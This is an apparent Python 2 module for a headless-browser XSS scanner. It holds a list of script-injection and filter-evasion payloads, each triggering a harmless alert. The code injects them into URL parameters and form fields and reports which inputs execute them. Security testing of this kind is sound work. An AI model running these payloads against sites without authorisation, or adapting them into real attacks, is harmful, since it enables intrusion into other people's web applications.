from ghost import Ghost, TimeoutError
from utils import create_form_selector, add_url_params, INPUT_TYPE_DICT
from urlparse import urlparse, urlunparse, parse_qsl
from urllib import urlencode

import copy
import sys

browser = Ghost()

POST, GET = 'POST', 'GET'

XSS_STRING = 'xssed'
INJECTIONS = [
    "\"><script>alert('xssed')</script>",
    "\"><sCriPt>alert('xssed')</sCriPt>",
    "\"; alert('xssed')",
    # "\"></sCriPt><sCriPt >alert('xssed')</sCriPt>",
    # "\"><img Src=0x94 onerror=alert('xssed')>",
    # "\"><BODY ONLOAD=alert('xssed')>",
    # "'%2Balert('xssed')%2B'",
    # "\"><'xssed'>",
    # "'+alert('xssed')+'",
    # "%2Balert('xssed')%2B'",
    # "'\"--></style></script><script>alert('xssed')</script>",
    # "'</style></script><script>alert('xssed')</script>",
    # "</script><script>alert('xssed')</script>",
    # "</style></script><script>alert('xssed')</script>",
    # "'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3E0x94('xssed')%3C",
    # "'\"--></style></script><script>alert('xssed')</script>",
    # "';alert('xssed')'",
    # "<scr<script>ipt>alert('xssed')</script>",
    # "<scr<script>ipt>alert('xssed')</scr</script>ipt>",
    # "\"<scr<script>ipt>alert('xssed')</scr</script>ipt>",
    # "\"><scr<script>ipt>alert('xssed')</script>",
    "\">'</style></script><script>alert('xssed')</script>",
    "\"></script><script>alert('xssed')</script>",
    "\"></style></script><script>alert('xssed')</script>",
    # "<IMG SRC=\" &#14;  javascript:alert('xssed');\">",
    # "</title>\"><iframe onerror=\"alert('xssed');\" src=x></iframe>",
    # "<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzZWQnKTwvc2NyaXB0Pg==\">",
    # "<img src=x onerror=alert('xssed')>",
    # "<scri%00pt>alert('xssed');</scri%00pt>",
    # "<svg/onload=prompt('xssed');>",
    # "<iframe/src=\"data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KCd4c3NlZCcpPg==\">"
]

def xss(page, client):
    parsed_url = urlparse(page.url)
    try:
        with browser.start() as session:
            session.load_cookies(page.cookies)

            if parsed_url.query:
                url_xss_report = check_url_xss(parsed_url, session, client)
                print 'URL_XSS', url_xss_report

            for form in page.get_forms():
                report = {}
                method = form.get('method') or GET
                injectable, immutable = get_form_params(form)

                for param in injectable.keys():
                    successed = []

                    for injection in INJECTIONS:
                        inject = inject_param(injectable, param, injection)
                        inject.update(immutable)

                        if method.lower() == POST.lower():
                            session_page, extra_resources = session.open(page.url, headers=client.default_headers)

                            selector = create_form_selector(form)
                            fill_result, _ = session.fill(selector, dict(inject))
                            response_page, _ = session.call(selector, "submit", expect_loading=True)
                            result, _ = session.wait_for_alert(1)
                        else:
                            injected_url = add_url_params(page.url, inject)
                            print injected_url
                            response_page, extra_resources = session.open(injected_url, headers=client.default_headers, encode_url=False)
                            result, _ = session.wait_for_alert(1)

                        if result == XSS_STRING:
                            successed.append(injection)

                    if successed:
                        report.update({param: successed})
                if report:
                    print 'FORM XSS', form.get('action'), report

    except TimeoutError as e:
        pass
        # print page.url, e
    # except Exception as e:
    #     raise e


def inject_param(parameters, param, injection):
    injected = parameters
    injected[param] += injection
    return injected

def get_form_params(form):
    injectable, immutable = {}, {}
    immutable_types = ['submit', 'button', 'hidden']
    inputs = form.find_all('input')
    textareas = form.find_all('textarea')

    for inpt in inputs:
        name = str(inpt.get('name') or '')
        if not name:
            continue
        itype = inpt.get('type')
        value = str(inpt.get('value') or INPUT_TYPE_DICT[itype])
        if itype in immutable_types:
            immutable[name] = value
        else:
            injectable[name] = value


    for txt in textareas:
        name = str(txt.get('name'))
        value = str(txt.text or INPUT_TYPE_DICT['text'])
        injectable[name] = value

    return [injectable, immutable]

def check_url_xss(url, session, client):
    url_parts = list(url)
    query = dict(parse_qsl(url_parts[4]))

    report = {}

    for param, value in query.iteritems():
        successed = []
        for injection in INJECTIONS:
            try:
                inj_query = copy.deepcopy(query)
                inj_query.update({param: value + injection})
                url_parts[4] = urlencode(inj_query)
                injected_url = urlunparse(url_parts)

                response_page, extra_resources = session.open(injected_url, headers=client.default_headers, encode_url=False)
                result, _ = session.wait_for_alert(1)

                if result == XSS_STRING:
                    successed.append(injection)

            except TimeoutError as e:
                continue
            except Exception as e:
                raise e

        if successed:
            report.update({param: successed})

    return report
